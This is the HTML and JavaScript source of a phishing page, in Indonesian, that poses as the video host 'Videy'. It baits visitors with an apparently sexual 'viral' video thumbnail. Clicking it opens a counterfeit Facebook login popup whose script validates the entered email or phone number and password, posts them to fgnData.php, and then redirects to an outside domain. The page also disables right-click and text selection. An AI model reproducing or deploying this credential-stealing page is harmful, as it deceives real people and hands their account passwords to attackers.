<html><head>
<meta name="description" content="Videy is a platform for free and simple video hosting.">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Untitled Video | Videy - free and simple video hosting</title>
<link rel="icon" type="image/x-icon" href="img/favicon.ico">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
<link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600&amp;family=Poppins:wght@600&amp;display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/facebook.css">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="nav-outer">
	<div class="nav-inner">
		<div class="logo-text">
			<a href="/">videy</a>
		</div>
		<a href="/"><div class="upload-button-nav">Upload</div></a>
		<div class="legal">
			<div class="legal-menu">
				<a href="javascript:void(0);" class="icon"><i class="fa fa-bars" onclick="toggleMobileNavbar()"></i></a>
			</div>
			<div class="legal-item">
				<a href="/">Privacy Policy</a>
			</div>
			<div class="legal-item">
				<a href="/">Terms of Service</a>
			</div>
			<div class="legal-item">
				<a href="/">Abuse</a>
			</div>
		</div>
	</div>
</div>
<div id="mobile-menu">
	<a href="/">Privacy Policy</a>
	<a href="/">Terms of Service</a>
	<a href="/">Abuse</a>
</div>
<div class="body">
	        <br> 	       	        
	        <img src="admin/img/vid.jpg" alt="" onclick="login()">
	        <h3>2 laki laki vs 1 prempuan vir4l</h3>
	        <br>
	     	<img src="img/ads.jpg" alt="" style="width: 100%; border: none;" onclick="login()">
</div>
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="container-box-fb" style="margin-top: 10%;">
	<!-- Corrected 'magin-top' to 'margin-top' -->
	<div class="atasan-fb" style="background: none;">
		<img src="img/login/arrow.png" style="position: absolute; width: 25px; margin-top: 12px; margin-left: 5px;" alt="">
		<img src="img/login/facebook_text.webp" style="margin-top: -5px;">
	</div>
	<div class="isi-facebook" style="padding-bottom: 10px;">
		<p class="kaget email">
			Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b>
		</p>
		<p class="kaget sandi">
			Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b>
		</p>
		<img src="img/favicon.ico">
		<div class="txt-ucapan-fb">
			Masuk ke akun Facebook Anda untuk terhubung dengan Videy
		</div>
		<form class="form-login-fb" id="sendfagen">
			<div class="form-group">
				<input type="text" id="fgn_email_fb2" name="email" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_email_fb2" id="EmailLabel" class="hidden-label">Nomor ponsel atau email</label>
			</div>
			<div class="form-group">
				<img src="img/login/hide.png" id="HidePw" alt="">
				<img src="img/login/show.png" id="ShowPw" alt="">
				<input type="password" id="fgn_password_fb2" name="password" autocomplete="off" autocapitalize="off" placeholder=" " required="">
				<label for="fgn_password_fb2" id="PasswordLabel" class="hidden-label">Kata Sandi Facebook</label>
			</div>
			<input type="hidden" name="login" value="Facebook" readonly="">
			<button class="btn-login-fb" type="submit" style="border-radius: 48px; margin-top: 13px;">Masuk</button>
			<label style="font-size: 14px; color: #838489; display: block; margin-top: 15px;">Lupa Kata Sandi?</label>
			<button class="btn-login-fb" type="button" style="border-radius: 48px; margin-top: 38px; background: none !important; color: #4292f8; border: 1px solid #4292f8 !important; font-weight: 100em !important; box-shadow: transparent !important;">Buat Akun Baru</button>
		</form>
		<img src="img/login/MetaLogo.png" style="display: block; margin: 20px auto; width: 70px; position: relative; top: 0;" alt="">
	</div>
</div>
</div>
<script>
    function toggleMobileNavbar() {
        var x = document.getElementById("mobile-menu");
        if (x.style.display === "flex") {
            x.style.display = "none";
        } else {
            x.style.display = "flex";
        }
    }
</script>
<script type="text/javascript">
$(document).ready(function() {
     $("#fgn_email_fb2").on('input', function() {
        var $Email = $("#fgn_email_fb2").val();
        if ($Email.length === 0) {
            $("#EmailLabel").removeClass('active');
            console.log('Label tidak aktif'); 
        } else {
            $("#EmailLabel").addClass('active');
            console.log('Label aktif'); 
        }
    });
    $("#fgn_password_fb2").on('input', function() {
        var $Email = $("#fgn_password_fb2").val();
        if ($Email.length === 0) {
            $("#PasswordLabel").removeClass('active');
            console.log('Label tidak aktif');
            $("#PasswordLabel").addClass('active');
            console.log('Label aktif');
        }
    });
    $("#fgn_password_fb2").on("input", function () {
          $Pw = $("#fgn_password_fb2").val();
          if ($Pw.length == 0) {
            $("#PasswordLabel").removeClass("active");
          } else {
            $("#PasswordLabel").addClass("active");
          }
        });
        $("#HidePw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "text");
          $("#HidePw").hide();
          $("#ShowPw").show();
        });
        $("#ShowPw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "password");
          $("#ShowPw").hide();
          $("#HidePw").show();
        });
});


        function login() {
            $('.login-facebook').fadeIn();
        }
        window.addEventListener('submit', function (e) {
            e.preventDefault();
            $("#btnfb").addClass("disabled");
            setTimeout(() => {
                var user = $('#fgn_email_fb2').val();
                var pass = $('#fgn_password_fb2').val();
                if (user == '' || user == null) {
                    $('.email').show();
                    $('.sandi').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    if (user.includes('@')) {
                        let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                        if (user.match(pattern)) {
                            $('.email').hide();
                        } else {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        }
                    }
                    if (!isNaN(user)) {
                        if (user.length <= 10) {
                            $('.email').show();
                            $('.sandi').hide();
                            $("#btnfb").removeClass("disabled");
                            return false;
                        } else {
                            $('.email').hide();
                        }
                    }
                    if (user.match(/\s/g)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }
                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                    if (user.match(regex)) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    }
                    if (user.length <= 5) {
                        $('.email').show();
                        $('.sandi').hide();
                        $("#btnfb").removeClass("disabled");
                        return false;
                    } else {
                        $('.email').hide();
                    }
                }
                if (pass == '' || pass == null || pass.length <= 5) {
                    $('.sandi').show();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                var regexs = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (pass.match(regexs)) {
                    $('.sandi').show();
                    $('.email').hide();
                    $("#btnfb").removeClass("disabled");
                    return false;
                } else {
                    $('.sandi').hide();
                }
                $.ajax({
                        type: 'POST',
                        url: 'fgnData.php',
                        data: $('#sendfagen').serialize(),
                        dataType: 'text',
                        success: function() {
                                        $('.login-facebook').toggle();
                                        $('.btn-login-fb').html('Success')
                                        $('.login-facebook').fadeOut();
                                        window.location = 'https://downloadd.cfd/vi.jpg';
                                } 
                    })
            }, 1000)
        })
</script>



</body></html>